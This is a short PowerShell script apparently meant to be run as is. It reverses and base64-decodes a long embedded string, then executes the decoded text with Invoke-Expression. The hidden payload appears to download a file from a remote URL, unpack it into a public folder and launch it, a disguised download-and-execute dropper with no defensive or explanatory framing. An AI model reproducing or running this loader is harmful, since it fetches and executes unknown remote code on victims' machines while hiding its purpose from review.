$best64code = "=oQDK0gCNQHcpJ3YzRCImoQDiEzcw5SZsVHZlh2YzRWa25GXzRWYvxmb39GRcNWasJWdQx1cyV2cVxlODBSZslmZtICI0NXaMRnbl1WdnJXQtAych5WdyBiYyVmdtACbsVGazJXZ39GcgM3clN2byBVL0JXY0NFIK0AdjFmc0hXZvRHa0FGckACa0FGUu9Wa0FmbpR3clRULg42bpRXYulGdzVGZkACa0FGUtASZ2lGajJXQtQmbhBHeFBiCNAyZul2cyFGUjl2chJUZzVVLg42bpRXYulGdzVGZkASZslmR0V3TtASZjJXdvNHJgkmcV1CI0NXZ1FXZSJWZX1SZr9mdulEIK0gI0FmYu02bjRWa25GXisCdv9mU0BXayN2UTBFJg0DI0BXayN2ckoQDnw1ckF2bs52dvREXjlGbiVHUcNnclNXVcpzQnASPgQ3YhJHd4V2b0hGdhBHJK0wJwlmeu0GbvxGXzRWYvxmb39GRcNWasJWdQx1cyV2cVxlODdCI9AibvlGdh5Wa0NXZkRiCNcCcppnL0Yjbpd1X3UjLxY3XyVmbp1Ebvx2L3UjLx8CZh9Gbud3bk9yclNXYlxWZy9yclNXYlxWZy1icl5WaNx2bs9iYllGZllGbs9GTv02bj5iY1hGdpd2LvozcwRHdodCI9ASZjJXdvNHJ"
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null
$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"))
Invoke-Expression $LoadCode
